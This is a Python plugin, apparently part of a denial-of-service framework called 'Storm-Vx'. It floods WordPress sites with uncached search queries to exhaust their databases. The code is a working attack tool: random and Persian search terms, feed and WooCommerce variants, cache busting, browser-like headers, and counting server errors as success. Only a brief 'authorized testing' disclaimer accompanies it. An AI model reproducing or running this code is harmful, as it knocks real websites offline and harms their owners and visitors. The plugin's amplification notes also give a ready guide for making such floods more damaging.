#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_wp_search_bomb — WordPress Search Bomb Attack Plugin

WordPress search (?s=<term>) is one of the heaviest uncached endpoints:
- Triggers LIKE %term% query on wp_posts table (full table scan)
- No caching for search results (unique query each time)
- Relevance scoring (ORDER BY relevance) = extra CPU
- With WooCommerce: product search = JOIN with wc_product_meta_lookup
- Unicode/Persian search terms = even heavier collation processing

Amplification strategies:
- Random search terms → unique queries = no cache hits
- Persian/Unicode chars → heavier collation processing
- Long terms → LIKE with wildcards = slower scan
- Combined with post_type=product → WooCommerce JOIN
- RSS search feed → /?s=<term>&feed=rss2 (XML rendering = more CPU)

Amplification: ~2x per request (DB-heavy LIKE query)

Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
from typing import Dict, Any, List
from urllib.parse import quote

import aiohttp

from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin, ResponseClass
from vf_common import rand_str, rand_cache_bust

from logging_config import get_logger
logger = get_logger(__name__)


__all__ = ["WpSearchBombPlugin"]


# Search term generation strategies
def _gen_search_term() -> str:
    """Generate a random search term.

    Mix of:
    - Short English words (3-6 chars) — fast queries
    - Long English phrases (8-15 chars) — slow LIKE scans
    - Unicode/Persian characters — heavier collation processing
    - Numbers — integer index lookups
    """
    roll = random.random()
    if roll < 0.4:
        # Short English
        return rand_str(random.randint(3, 6))
    elif roll < 0.7:
        # Long English phrase
        return f"{rand_str(random.randint(4, 8))}+{rand_str(random.randint(3, 6))}"
    elif roll < 0.85:
        # Persian/Unicode — forces collation processing
        persian_chars = "ابپتثجچحخدذرزژسشصضطظعغفقکگلمنوهی"
        return "".join(random.choice(persian_chars) for _ in range(random.randint(3, 7)))
    else:
        # Numbers
        return str(random.randint(100, 99999))


# Search URL patterns
_WP_SEARCH_PATTERNS: List[str] = [
    # Standard search
    "/?s={term}",
    # Search with post type (WooCommerce product search)
    "/?s={term}&post_type=product",
    # Search RSS feed (XML rendering = more CPU)
    "/?s={term}&feed=rss2",
    # Search Atom feed
    "/?s={term}&feed=atom",
    # Search with pagination (forces DB OFFSET)
    "/?s={term}&paged=2",
    "/?s={term}&paged=3",
    # Search in specific category
    "/?s={term}&cat=1",
    # Search by author
    "/?s={term}&author=1",
    # Search with date filter (generated per-request)
    "/?s={term}&date_filter=1",
    # Pretty permalink search
    "/search/{term}",
]


class WpSearchBombPlugin(AttackPlugin):
    """WordPress search bomb — full-text LIKE queries on posts table.

    WordPress search is always uncached because each query is unique.
    The LIKE %term% query scans the entire wp_posts table without
    using indexes (no fulltext index by default). This makes search
    one of the most DB-intensive WordPress operations.

    With WooCommerce active, product search adds JOINs to
    wc_product_meta_lookup and wc_product_attributes_lookup tables.
    """

    meta = PluginMeta(
        name='wp_search_bomb',
        version='1.0.0',
        plugin_type='attack',
        description='WordPress search bomb — LIKE queries on wp_posts table (2x amplification)',
        tags=['http', 'wordpress', 'search', 'db-burn', 'amplification'],
        priority=20,
        compatible_profiles=[],
        requirements=['aiohttp'],
    )

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """WordPress search bomb worker: random LIKE queries."""
        _ssl = context.ssl_param
        site_root = context.site_root
        delay_ms = context.extra.delay_ms

        while not self._stop_event.is_set():
            try:
                # Generate random search term
                term = _gen_search_term()
                encoded_term = quote(term, safe='')

                # Pick a search URL pattern
                pattern = random.choice(_WP_SEARCH_PATTERNS)
                path = pattern.format(term=encoded_term)

                # BUG-FIX v34: Replace date_filter placeholder with random date
                if "date_filter=1" in path:
                    date_val = f"{random.randint(2020, 2025)}{random.randint(1, 12):02d}"
                    path = path.replace("date_filter=1", f"m={date_val}")

                # Build full URL
                url = f"{site_root}{path}"

                # Add cache busting (some caches may cache search results)
                url += f"{'&' if '?' in url else '?'}{rand_cache_bust()}"

                # Use document-type headers (looks like real search)
                headers = self._get_fresh_headers(context, "document")

                t = time.monotonic()
                try:
                    async with context.session.get(
                        url, headers=headers,
                        ssl=_ssl, allow_redirects=False,
                    ) as resp:
                        rt = time.monotonic() - t
                        resp_headers = dict(resp.headers)
                        response_class = self._process_response(
                            resp.status, resp_headers,
                            url=url[:60], worker_id=worker_id
                        )
                        # Search: 200 (results), 404 (no results=still queried DB!),
                        # 500 (DB timeout=overloaded!), 302 (redirect=still processed)
                        # BUG-FIX v35: NOT_FOUND counts as ok because WordPress
                        # still executed the LIKE query even when no results found
                        ok = response_class in (
                            ResponseClass.OK, ResponseClass.AUTH_REQUIRED,
                            ResponseClass.SERVER_ERROR, ResponseClass.REDIRECT,
                            ResponseClass.NOT_FOUND
                        )
                        self._capture_response_cookies(resp, context)
                        await self._record(
                            "WP-SEARCH", ok, resp.status, rt,
                            url=url[:60], hint=f"s={term[:15]}",
                        )
                except asyncio.CancelledError:
                    raise
                except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                    rt = time.monotonic() - t
                    self._on_request_result(worker_id, False)
                    await self._record(
                        "WP-SEARCH", False, 0, rt,
                        err=type(exc).__name__, url=url[:60],
                    )

                # Adaptive sleep
                await self._adaptive_sleep(worker_id, delay_ms)

            except asyncio.CancelledError:
                return
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                self._on_request_result(worker_id, False)
                await self._record("WP-SEARCH", False, 0, 0, err=type(exc).__name__)
                await asyncio.sleep(0.1)
